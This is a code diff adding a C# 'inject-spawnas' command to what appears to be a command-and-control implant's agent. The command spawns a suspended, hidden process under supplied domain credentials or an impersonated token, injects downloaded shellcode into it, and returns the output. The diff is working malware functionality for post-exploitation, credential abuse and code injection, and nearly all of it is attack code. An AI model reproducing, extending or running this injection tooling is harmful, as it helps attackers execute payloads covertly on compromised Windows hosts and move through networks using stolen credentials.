@@ -68,4 +68,66 @@ namespace Agent.Commands
 
      
     }
+
+    public class SpawnInjectAsCommand : SpawnInjectCommand
+    {
+        public override string Name => "inject-spawnas";
+
+        protected override bool RedirectOutput => true;
+
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        {
+            string usr = task.SplittedArgs[0];
+            string password = task.SplittedArgs[1];
+
+            var tab = usr.Split('\\');
+            var username = tab[1];
+            var domain = tab[0];
+
+            this.CheckFileDownloaded(task, context);
+
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            var shellcode = file.GetFileContent();
+
+            try
+            {
+                ProcessCredentials creds = new ProcessCredentials()
+                {
+                    Domain = domain,
+                    Username = username,
+                    Password = password,
+                };
+
+                var creationParms = new ProcessCreationParameters()
+                {
+                    Application = context.ConfigService.SpawnToX64,
+                    RedirectOutput = this.RedirectOutput,
+                    CreateNoWindow = true,
+                    CreateSuspended = true,
+                    CurrentDirectory = Environment.CurrentDirectory,
+                    Credentials = creds,
+
+                };
+
+                if (ImpersonationHelper.HasCurrentImpersonation)
+                    creationParms.Token = ImpersonationHelper.ImpersonatedToken;
+
+                var procResult = APIWrapper.CreateProcess(creationParms);
+
+                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, context.ConfigService.APIInjectionMethod);
+
+                if (creationParms.RedirectOutput)
+                    APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
+                else
+                    context.AppendResult($"Injection succeed.");
+            }
+            catch (Exception ex)
+            {
+                context.Error($"Injection failed : {ex}");
+                return;
+            }
+
+
+        }
+    }
 }
